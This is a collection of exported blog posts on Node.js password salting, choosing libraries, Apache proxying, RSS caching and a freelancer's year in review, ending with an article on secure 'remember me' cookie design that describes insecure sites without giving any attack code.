err;});</pre></div><p>Its database representation will look like this:</p><div><pre class=\"brush: jscript; title: ; notranslate\">{\"passwdHash\" : \"b604367796274cf64177eec345532fc6ca66c6f0501906f82bb03f7916265e9d\",\"name\" : \"test_user\",\"email\" : \"blah\",\"_id\" : ObjectId(\"4f1dbb2cfa6157b118000001\"),\"salt\" : \"304a33f0-45fc-11e1-80d2-43c594a44fa0\"}</pre></div><p>If an attacker would get access to this, he'd have to generate a rainbow table using the salt value, which takes time, and even then he has no guarantee that the rainbow table will actually contain the correct password. Again, this is why it's so important to use a unique salt for every password. Also, you can use whatever value you want as the salt value so if you can determine it based on some other fields or by using a specific formula you don't need to store the actual salt value. It's recommended to use a long salt value though. Theoretically speaking, it's safer if the salt value isn't stored so clearly as I'm doing here, but even with the salt value clearly visible to a possible attacker, it would still be practically infeasible for him to generate all those rainbow tables.</p><p>And of course, my actual authentication function is still very simple as well:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var authenticate = function(username, password, callback) {User.findOne({ name: username }, function(err, user) {if (err) return callback(new Error('User not found'));if (user.isValidPassword(password)) return callback(null, user);return callback(new Error('Invalid password'));});};</pre></div><p>So as you can see, there's nothing hard or complicated about storing credentials in a secure manner. It's quite easy to do so and there are no downsides to doing this.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/bskd34YcIcg\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1210}}

Now, despite it being just a breakable toy, I want to do it with as few constraints on technical quality as possible because I want to maximize the learning experience I'm going to get from it. That means I don't just want to quickly put something together that just works. I want something that works, but that would also hold up in real world scenarios, even though the project will at best only be used by myself. Which means that I'm going to be picky about any libraries that I take a dependency on, just as I would if this were a project that I'd be getting paid to work on.</p><p>So as I was browsing through a few possible alternatives for my authentication needs, I started thinking about my thought process when evaluating libraries/frameworks to use. I generally base my decision on the following items, listed in order of importance (to me):</p><ul><li><strong>How well does it work for my scenario?</strong> If a library satisfies all other items on this list, that certainly doesn't mean it's an automatic lock. How it works and the impact it has on my code is definitely the most important factor.</li><li><strong>Popularity</strong>. I've noticed that I let the number of watchers/forks on sites like Github influence my opinion. If a project has many watchers and many forks, odds are high that there's a relatively large group of happy users as well as people involved with the project. It also increases the odds that the project will be around for a while. Of course, inactive Open Source projects often remain available as well but if nobody's working on it, I'm not exactly tempted to take a dependency on it. Log4net is a notable exception to this, obviously. But when a project has a lot of people interested in it, or better yet, contributing to it, it's a good sign that you'll easily get help if needed, it's only going to get better in the long run and that it might get forked should the original developers stop working on it. As the author of an Open Source project that doesn't have a lot of watchers/forks (<ahref=\"https://github.com/davybrion/Agatha\">Agatha</a>), I'm aware that my point of view on this is rather hypocritical but hey, it is what it is.</li><li><strong>Code quality</strong>. I don't have the time to do an in-depth review of the code as I'm sure most of us don't do either. But I do like to glance over the code to get a general feel of the quality of the code. I focus mostly on the clarity of the code and also keep an eye open for sloppiness or downright WTF's. I guess the questions I'm mostly trying to answer when doing this are: \"is this code I'd like to try to improve or fix if I need to?\" and \"how easy would it be to debug this when I need to troubleshoot some non-obvious issues?\".</li><li><strong>Location of code and issue tracker</strong>. A lot of people will probably take issue with this, but I consider it to be a major plus if the project is on Github. Not just because of my personal preference of Github, but because they truly encourage people to collaborate and contribute to projects and they make it very easy to do so. Also, the site is fast! I cringe when I have to look over issues of projects on Codeplex because it's just terribly slow. And the UI doesn't come close to that of Github either. I've heard that Bitbucket is pretty similar to Github, but I've never even looked for projects there. In any case: I want to be able to download the <em>latest</em> version of the code at any time, or of a particular branch if I need to, as easily as possible. I also prefer an issue tracker which is fast, responsive and easy to search. It doesn't have to be Github, but those 2 requirements are important to me.</li><li><strong>License</strong>. If it's GPL, I don't use it. Also, I check whether or not a commercial license needs to be purchased when you want to use the library/framework in production. Pay attention to dual-licensed projects because that Open Source license might not apply to commercial/production use!</li></ul><p>I'd love to hear your thoughts on this.

Of course, this approach only makes sense if you already have a server that's running Apache and you want to add your Node.js site with minimal impact/changes on your server. If you're not using Apache already but just want to publish a Node.js site, you're better off using Node.js to host it directly, or to put Nginx in front of it since it's more lightweight than Apache. But anyways, here's how you get it working with Apache.</p><p>First of all, you need a way to start your Node.js process automatically when your system boots, and to shut it down when the system is shut down. This will depend on the type of server you're running on. In my case, it's a Debian server so I just went with the <ahref=\"https://github.com/nicokaiser/node-monit/tree/master/init.d\" target=\"_blank\">sysv init script from Nico Kaiser</a>. Another popular alternative is the upstart utility, which is already preinstalled if you're using Ubuntu. Once you have a start|stop|restart script in place, you'll want something to monitor the Node.js process to restart it in case it goes down. An easy to use tool for this is <ahref=\"http://mmonit.com/monit/\" target=\"_blank\">monit</a>. Nico Kaiser again has a good example script available for Node.js on <ahref=\"https://github.com/nicokaiser/node-monit/tree/master/monit/conf.d\" target=\"_blank\">Github</a>.</p><p>Once you have your sysv init or upstart script in place, as well as monit, your Node.js process can stay running on your server. Of course, you probably have it set to listen to connections on some other port than port 80 because that's what your Apache server is listening on. So now, the only thing you have to do is configure Apache to proxy all requests coming in on port 80 through the URL of your Node.js site to your local Node.js process. You'll first need to install <ahref=\"http://httpd.apache.org/docs/2.1/mod/mod_proxy.html\" target=\"_blank\">mod_proxy</a> and <ahref=\"http://httpd.apache.org/docs/2.0/mod/mod_proxy_http.html\" target=\"_blank\">mod_proxy_http</a>. After that, the configuration to make it work is quite easy:</p><div><pre class=\"brush: xml; title: ; notranslate\">&lt;VirtualHost 109.74.199.47:80&gt;ServerAdmin davy.brion@thatextramile.beServerName thatextramile.beServerAlias www.thatextramile.beProxyRequests off&lt;Proxy *&gt;Order deny,allowAllow from all&lt;/Proxy&gt;&lt;Location /&gt;ProxyPass http://localhost:3000/ProxyPassReverse http://localhost:3000/&lt;/Location&gt;&lt;/VirtualHost&gt;</pre></div><p>And that's it. Every request coming in at http://thatextramile.be or http://www.thatextramile.be will be forwarded to http://localhost:3000 where Node.js is listening. Note that the ProxyPassReverse is required to make sure that all HTTP response headers will contain the proxied URL instead of the real one (localhost).</p><p>If you need the raw throughput that Node.js offers, this solution is far from optimal. Every request that comes in through Apache will cause an Apache thread to wait/block until the response is returned from your Node.js process. This is essentially the same as when hosting PHP or Ruby through Apache, so it's not a problem, but it does take away one of the benefits of using Node.js. Again, this approach only makes sense if you're already using Apache to host other sites and you just want to add a Node.js site with minimal impact to your server.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/r3DqhWiU0Qc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1212}}

Things have gone very well, and I'm amazed at how quickly it all went by. This time last year, I was looking forward to start working for my first client though I didn't quite know what to expect. I hoped it would be interesting, and it certainly has been. I've been able to work with interesting technologies, with the kind of technical variety that I've come to really enjoy. I wrote more code in JavaScript than in C# this year, and I've also been able to do quite a bit of Ruby as well. I certainly didn't expect that going into this contract, so that was a major bonus. Even better than the technologies I've been able to work with this year are the people I've worked with. The team I've worked with has a fantastic mix of experience, knowledge and talent and it feels like all of us continuously learn new things from each other which is a situation I can only recommend to every developer.</p><p>Another great part about being independent is that you're free to do extra things on the side as well. I'm very happy with the responses that I've gotten from the people who've taken my <ahref=\"http://thatextramile.be/training/nhibernate\">NHibernate course</a>, and I'm going to continue to offer it in 2012. I initially thought it would be something I'd do once or twice, but I was able to do the course 4 times this year: 1 public and 3 private ones. I've got another private one scheduled in February and will organize another public course in 2012, though this time I'm taking care of the whole thing myself instead of working with another company to organize it.</p><p>The most important thing I've learned from this first year is that it's important not to try to do too much. The first 6 months of 2011 were way too busy and hectic, and I only spent one full day doing absolutely nothing work-related. I've been taking things much slower since July and I'm spending much more time enjoying other things in life outside of work. For 2012, my biggest priority is pacing myself much better and spreading things out more. I always seem to alternate between months where I'm always working on something, followed by months of doing as little as possible outside of the 40 hours a week I do for my client. Hopefully, I can finally find a maintainable balance between those two extremes in 2012 <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>On the blogging front, 2011 was a different year than the previous ones on this blog. In the previous years, I averaged about 150 posts a year but this year I only published 71 posts. And I'm actually happy about that. In fact, I hope to get that number down to 50 next year. I still like writing posts, but I no longer feel the need to like I did in the past while I was trying to build a bit of an audience. That often meant pushing myself to keep publishing new posts. Nowadays, I'll only write a post if I really feel like it, which in the long run is much more sustainable anyway. As far as topics covered this year, things have changed quite a bit as well. Some of my views, opinions and technical preferences have changed this year, which naturally reflects in the content I've published. I'm sure I've lost some readers this year because of it, but I also seem to have gained a lot more readers than I've lost. I don't know yet what I'll be writing about in 2012, but I will continue to push people to learn new things (or old things that people seem to forget about) and do better like I always have on this blog, in my own unique way of course <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>I hope you all enjoyed Christmas, and I wish you all a happy 2012.

These are my requirements for this:</p><ul><li>It needs to be <strong>fast</strong></li><li>The fewer requests that are impacted by retrieving the feed data, the better</li><li>If I publish a post, the links on the company website should contain the new link within 30 minutes</li><li>The simpler the solution, the better</li></ul><p>I came up with a very simple solution, which satisfies these requirements better than any other solution I could think of, or heard of from other people. It is extremely fast, doesn't delay any requests, and doesn't require me to deploy anything but the company website. I'm building the site with <ahref=\"http://expressjs.com/\">Express</a> on <ahref=\"http://nodejs.org/\">Node.js</a>, which means I can take full advantage of the asynchronous nature of Node.js to implement this.</p><p>Let's go over the code... in the script that starts the express server, I have the following code:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var express = require('express'),app = module.exports = express.createServer(),NodePie = require('nodepie'),request = require('request'),recentFeedItems = null;app.dynamicHelpers({getRecentFeedItems: function() {return recentFeedItems;}});// ... some extra configuration of Express that isn't relevant to this postvar processFeed = function(callback) {request('http://feeds.feedburner.com/davybrion', function(err, response, body) {if (!err && response.statusCode == 200) {var feed = new NodePie(body);feed.init();recentFeedItems = feed.getItems(0, 5);if (callback) callback();};});};setInterval(processFeed, 1800000); // process feed items every 30 minutesprocessFeed(function() {app.listen(3000);console.log('Express started on port 3000');});</pre></div><p>I'll discuss the code in just a moment, but first I want to show the view code that renders the links:</p><div><pre class=\"brush: xml; title: ; notranslate\">&lt;ul&gt;&lt;% getRecentFeedItems.forEach(function(item) { %&gt;&lt;li&gt;&lt;time class=\"date\"&gt;&lt;%= item.getDate().getDate() + '/' + (item.getDate().getMonth() + 1) %&gt;&lt;/time&gt;&lt;a href=\"&lt;%= item.getPermalink() %&gt;\"&gt;&lt;%= item.getTitle() %&gt;&lt;/a&gt;&lt;/li&gt;&lt;% }); %&gt;&lt;/ul&gt;</pre></div><p>And that's all. This is the solution in its entirety!</p><p>If you're new to Node, this code probably requires some explanation. Let's start with this part:</p><div><pre class=\"brush: jscript; title: ; notranslate\">app.dynamicHelpers({getRecentFeedItems: function() {return recentFeedItems;}});</pre></div><p>Here I'm adding a dynamic helper to the Express application. It basically means that my views have access to the getRecentFeedItems function, which returns the value of the recentFeedItems variable. It's important to know that the getRecentFeedItems function creates a closure on the recentFeedItems variable created above it. That means that if the value of the recentFeedItems variable changes at any point in time, the getRecentFeedItems function will return that new value.</p><div><pre class=\"brush: jscript; title: ; notranslate\">var processFeed = function(callback) {request('http://feeds.feedburner.com/davybrion', function(err, response, body) {if (!err && response.statusCode == 200) {var feed = new NodePie(body);feed.init();recentFeedItems = feed.getItems(0, 5);if (callback) callback();};});};</pre></div><p>This just creates a function that we can use later on. It retrieves the feed asynchronously, and when the result is retrieved, we parse the feed using the NodePie library and we get the 5 most recent items which we store in the recentFeedItems variable. Again, this creates a closure on the recentFeedItems variable which means that every time we assign a value to this variable, any subsequent call to the getRecentFeedItems function will return the value we just assigned to it because both functions point to the same memory thanks to the magic of closures. Finally, if a callback is provided as a parameter, the callback will be invoked.</p><div><pre class=\"brush: jscript; title: ; notranslate\">setInterval(processFeed, 1800000); // process feed items every 30 minutesprocessFeed(function() {app.listen(3000);console.log('Express started on port 3000');});</pre></div><p>The call to setInterval makes sure that the processFeed function is called every 30 minutes. After that, we call the processFeed function manually, and we pass in a callback where we start the Express server. This guarantees that the feed items will be in memory before the server starts processing requests.</p><p>What makes this solution so great is that we take full advantage of some of Node's benefits. Whenever we retrieve the RSS feed, Node.JS will retrieve that data asynchronously. As soon as it has fired the request to get the RSS feed, it just goes to the next event in its eventloop so no request is kept waiting while we wait for the data to be downloaded. Until the data from the RSS feed is returned, each request will just use the items that are stored in the recentFeedItems variable. Once the data has been returned, our callback is executed which overwrites the value of the recentFeedItems variable. We don't need to do any locking here because the Node.JS eventloop is single-threaded: while our callback is running, no other code that has access to the recentFeedItems variable can be executed anyway. And the actual parsing of the RSS feed is done by NodePie, which uses <ahref=\"http://expat.sourceforge.net/\">expat</a> behind the scenes, which is supposedly the fastest C XML parser available.</p><p>Looking back on my initial requirements, I think this solution matches very well.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=YOg6tZlA7JI:EHTJxGRSvX8:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=YOg6tZlA7JI:EHTJxGRSvX8:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/YOg6tZlA7JI\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1215}}

Let’s start with the<em>really</em>wrong stuff and work from there.</p><a name='more'></a><h4>Anti-patterns</h4><p>This seems obvious, right? I mean the implementation of a “remember me” feature is pretty fundamental, not the sort of thing easily gotten wrong, surely? Apparently not.</p><p>Let me share two anti-patterns and we’ll discuss the problems with them before talking about how to do it right. The first example comes courtesy of Black& Decker, that would be the same B&D I recently wrote about in<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">Security is hard, insecurity is easy</a>. Here’s the idea when you login:</p><p><img width=\"488\" height=\"285\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Black& Decker\" src=\"http://lh5.ggpht.com/-wvgqafGAVEU/UdFF-1kwgAI/AAAAAAAAFb0/r7vYPJJfcM8/image5.png?imgmax=800\" border=\"0\"></p><p>That’s all pretty standard, the interesting bit comes after you log in. Let’s take a look at the cookies:</p><p><img width=\"798\" height=\"332\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Black& Decker cookies\" src=\"http://lh5.ggpht.com/-eP31JfR5TiQ/UdFF_gwV6qI/AAAAAAAAFb8/pcnOHLUp0IM/image2.png?imgmax=800\" border=\"0\"></p><p>This is a fairly impressive set of cookies but it’s the highlighted ones that are genuinely interesting. These cookies won’t get set if you don’t check the “remember me” box so their function is purely to log you back in later on. My email address is pretty clearly in there, but that’s not my password, instead it appears to be some sort of impenetrable fortress of cryptographic… hang on – that’s Base64 encoding! The thing about Base64 encoding is that it’s neatly complemented by Base64<em>de</em>coding which means that you can head off to somewhere like<a href=\"http://www.base64decode.org\">base64decode.org</a>and do this:</p><p><img width=\"514\" height=\"313\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Base 64 decoding the Black& Decker cookie\" src=\"http://lh3.ggpht.com/-aQZzH2NHr6c/UdFGASLoJQI/AAAAAAAAFcE/bxNThlU8CnQ/image8.png?imgmax=800\" border=\"0\"></p><p>Now not everyone uses Base64 as a means of “cryptography” (yes,<a href=\"http://www.troyhunt.com/2013/01/the-problem-with-website-security-is-us.html\">some people do genuinely do this</a>) and indeed it’s a perfectly legitimate means of representing data in an ASCII format, the real story here however is that this is my password sitting there in my browser in plain text. You may wonder – why is this a problem? It’s in your own browser, right? How does an attacker get it?</p><p>I’m going to talk about two very easy ways and the first relates to the earlier link about insecurity being easy. Black& Decker had exposed ELMAH logs and in those logs was every unhandled internal server exception, somewhere north of 50,000 of them at the time I reported it to them. When ELMAH logs an exception it also logs all the request headers which means the<em>cookies</em>are logged. Combine that with the huge number of unhandled exceptions being thrown by the system and now you have a treasure trove of user credentials. Yes, they should have secured their ELMAH log properly to begin with but it’s a good example of how you can be very easily undone by one very simple misconfiguration.</p><p>Here’s another one:</p><p><img width=\"250\" height=\"378\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Aussie Farmers Direct\" src=\"http://lh3.ggpht.com/-0MQkqGmrVW8/UdFGBK_Z0QI/AAAAAAAAFcM/7HqbqOyYEEM/image311.png?imgmax=800\" border=\"0\"></p><p>This is<a href=\"https://orders.aussiefarmers.com.au\">Aussie Farmers Direct</a>and it’s a fairly typical looking log in form. Let’s log in, tell it to “remember me” then take a look at the cookies:</p><p><img width=\"796\" height=\"139\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Aussie Farmers Direct cookies\" src=\"http://lh5.ggpht.com/-5OyfmaliDfc/UdFGB70cl0I/AAAAAAAAFcU/kFUtgoBKXrk/image91.png?imgmax=800\" border=\"0\"></p><p>Oh dear, same deal again but without any Base64 encoding. Actually this one is particularly bad because you can do stuff like this:</p><p><img width=\"476\" height=\"37\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Improperly encoded cookie on Aussie Farmers Direct\" src=\"http://lh5.ggpht.com/-HMSOuv66vcg/UdFGCsHlkYI/AAAAAAAAFcc/0emkrm4pDqQ/image18.png?imgmax=800\" border=\"0\"></p><p>XSS your own JSON cookie? Sure! The other idiosyncrasy is that changing your password doesn’t change the cookie so you come back to the site later on and it tries to log you in with the old one. Oops.</p><p>Aussie Farmers Direct doesn’t have exposed ELMAH logs (being PHP kind of helps with that!) but they do have other risks such as XSS (incidentally, this has been responsibly disclosed and the risk summarily dismissed – multiple times). The other thing about both the sites above is that those cookies holding the passwords aren’t flagged as HttpOnly, you can see this in the second column from the right in the cookie lists. What this means is that client script can access those cookies which means that if you can get a piece of XSS onto the site – just as you can on the Aussie Farmers site – you can steal cookies containing passwords if you can get a customer to load the XSS payload (and there are numerous ways of doing that). The missing HttpOnly attribute is sloppy on behalf of both sites, but the core of the issue is storing passwords in cookies which then makes them vulnerable via other oversights.</p><p>There’s one more fundamentally important reason why both these practices are negligent; they’re protecting customers’ credentials used on other sites. Every time a customer using the “remember me” feature on one of the sites above makes a request, there’s a very good chance they’re sending the username and password to their email, their eBay or their bank across the wire, sometimes in plain text, sometimes accessible via client script, always sitting there unprotected in the browser.<a href=\"http://www.troyhunt.com/2012/07/what-do-sony-and-yahoo-have-in-common.html\">Password reuse is rampant</a>and whilst those damn users should take some bloody responsibility (I’m paraphrasing here!), we – as developers –<em>must</em>acknowledge that we’re protecting far more than just our own site when we handle credentials.</p><p>So that should establish that there is a genuine misunderstanding of how the “remember me” feature<em>should</em>be built, let’s now move onto the good practices.</p><h4>A sample reference implementation</h4><p>One of the mantras you frequently hear in the security world is “Don’t roll your own – use what’s already been proven to be robust”. This is very frequently applied to encryption and authentication schemes but in this case we can extend this to the “remember me” feature in order to start with a good reference implementation before we delve into the details.</p><p>In a new ASP.NET MVC 4 website provisioned with Visual Studio 2012 you get this right out of the box:</p><p><img width=\"352\" height=\"338\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to a sample ASP.NET application\" src=\"http://lh3.ggpht.com/-T6wJXCWtnpQ/UdFGDJgd8iI/AAAAAAAAFck/vaA2S0PkYic/image31%25255B1%25255D.png?imgmax=800\" border=\"0\"></p><p>Other frameworks have other standard modes of implementing this feature but this is an easy one for me to refer to. When we login with the fields as above (i.e. not asking it to remember me), successful authentication results in the following cookie being returned:</p><pre>Set-Cookie:.ASPXAUTH=6891A5EAF17A9C35B51C4ED3C473FBA294187C97B758880F9A56E3D335E2F020B86A85E1D0074BDAB2E1C9DBE590AF67895C0F989BA137E292035A3093A702DEC9D0D8089E1D007089F75A77D1B2A79CAA800E8F62D3D807CBB86779DB52F012; path=/; HttpOnly</pre><p>This is simply an auth cookie and in the stateless world that is HTTP it’s the one little piece of data that ties all the otherwise entirely independent requests from one person together. Each time this unique-to-me cookie is sent, the website knows it’s me and that I’ve already authenticated. We can see it bit more clearly when we look at it in Chrome’s Cookies collection:</p><p><img width=\"794\" height=\"56\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Cookies from a sample ASP.NET application without the\"remember me\" box checked\" src=\"http://lh3.ggpht.com/-8rKwUf_wQtk/UdFGDifnEmI/AAAAAAAAFcs/HrHn4wNix-s/image6.png?imgmax=800\" border=\"0\"></p><p>Incidentally, the second cookie is an anti-forgery token to prevent CSRF attacks and has nothing to do with our authenticated state.

Let’s take a closer look at that.</p><h4>Looking at auth cookie expiration</h4><p>This is actually a ridiculously easy security construct and it’s only in light of the earlier examples that I’d even think it worth writing about, but here we are. In this implementation, the “remember me” feature simply boils down to when the auth cookie expires because what you’re really doing here is controlling how long you want someone to stay logged on for, it’s that simple.</p><p>In the example above, ASP.NET defaults to using a session cookie or in other words, a cookie that does not have an explicit expiration date and will therefore forcibly expire when the browser is closed. That’s one approach, another is to explicitly set a short expiration period so that even if the browser is left open the user will be automatically logged out after a period of time. Of course you can also control this behaviour on the server and you can also keep extending the lifetime of an auth cookie if the system is being actively used by the server increasing the expiration date on response.</p><p>Remembering someone can be as simple as keeping that auth cookie alive. How long should it be kept alive for? The example above defaults to two days which is probably a bit short for many legitimate uses of the feature (although it’s easily configurable in ASP.NET), try Facebook though and you’ll get cookies that last for a year. Shorter duration means less risk but more inconvenience, longer duration makes it easier for the user but increases the window of potential attack. Let’s take a look at that risk in more detail.</p><h4>Exploiting long-running authentication state</h4><p>While you are not authenticated, your session can’t be hijacked. I know, insightful stuff! But seriously, take a case like Aussie Farmers Direct above; that cookie will expire in six months and combined with the fact that it’s not flagged as HTTP only and that they have XSS flaws in the site there’s now half a year window where just following a link could cause me to inadvertently hand over my credentials to an attacker. If that period was, say, one month yes, they’d still have some serious flaws in their design but then the window of opportunity for an attacker has just been slashed.</p><p>On the other hand, Black& Decker has a relative short one week expiration period so in their case with the exposed ELMAH logs, yes, there was a series of bad failures on their part but unless someone had logged in with the “remember me” box ticked in the last week<em>and</em>caused an unhandled exception, the credentials wouldn’t be put on public display. Ok, if you’re on the site to begin with there’s a good chance you’re already logged in (at least compared to the Farmers example where you wouldn’t have to consciously go anywhere near the site to lose your password) but you can see how that risk profile changes with the cookie expiration period.</p><p>Of course underlying all this is that the auth cookie needs to be carefully protected; HttpOnly and secure attributes are an absolute must. All your classic hijacking threats remain relevant but then again, however you slice and dice this feature you’re going to end up with a cookie dependency therefore you’re going to need to watch those cookies very, very carefully.</p><p>Ultimately it’s a trade-off that needs to consider factors such as the value to an attacker of the user’s data on the site, the barrier that<em>not</em>being authenticated poses to a returning user and the security profile of the rest of the site. For example, Facebook has some very useful data of a social nature and users expect a low-friction (even<em>no</em>-friction) process when returning, plus they’ve made<em>massive</em>investments in their security profile. Aussie Farmer’s, on the other hand, holds personally identifiable user data plus financial info whilst providing a service that people<em>expect</em>to authenticate to (payment facilities) yet have little understanding of important security concepts. They’re very different risk profiles and they<em>should</em>be very different auth cookie expiration strategies.</p><h4>Strengthening the approach</h4><p>There will be folks who look at the auth cookie approach and roll their eyes in despair. The thing about security is that there’s always a better way depending on the time / money / complexity you’re willing to add and there’s also always someone ready to tell you you’ve got it wrong! Using the auth cookie expiration as a starting point, let’s look at some possible ways of strengthening the approach.</p><p>One argument against long expiration of auth cookies is that they’re effectively keeping the user authenticated and at risk of attacks such as CSRF or clickjacking. Of course the application needs to exhibit other risks in order for an attacker to capitalise on the long lasting cookie but the whole defence in depth argument comes up again. An alternative is to have a dedicated cookie keyed against the user which after validating the authenticity of it with the server, can then initiate a new authenticated session on their return. The original session can then expire quickly, the trick is to re-instate a new one when the user comes back with the dedicated “remember me” cookie and include some additional validation in the process.</p><p>One way of providing additional validation is by including the user’s IP address / user agent / other distinguishing feature in the “remember me” cookie. The rationale is that this offers some defence against hijacking of the cookie. The problem, of course, is that there are legitimate use cases where these change. In the mobile world in particular it’s not uncommon to return to a site with a different IP. Even in the world of physical connections you can’t necessarily rely on the ISP providing a static IP address. As for user agents, with browsers like Chrome and Firefox updating at what seems like every other day, unless you’re a bit selective about<em>what</em>attributes of the user agent string you’re storing and comparing that’s going to be a risky approach. The same defences around using unique user attributes to and add security are often discussed in the context of session and auth cookies and whilst I’m sure there are valid use cases for this (back to banking again), I can’t say I’ve actually seen it in place in any of the sites I’ve tested before. There’s probably a good reason for that…</p><p>A more pragmatic mitigation is to still separate the auth cookie from a dedicated “remember me” cookie and use the latter to re-authenticate the user<em>but impose some restrictions</em>. The reality is that the process of automatically persisting someone’s authenticated state – through whatever means – introduces compromises to the security model. A mitigation would be to require an automatically re-authenticated user to expressly provide their credentials again before viewing certain classes of data or performing certain activities. This is not unheard of even outside the scope of “remember me”, you might see it when performing high-value activities such as a bank transfer. In this case, we’re saying that the authenticated user is at greater risk because there’s more likelihood that they’re not who they say they are (i.e. someone else has sat down at the PC and effectively highjacked a session).</p><p>The other hardening we can apply to this approach is to ensure that the cookie used to remember the user is reset after it has been used. This also means invalidating it on the server side so there needs to be both uniqueness and persistence of the cookie value, for 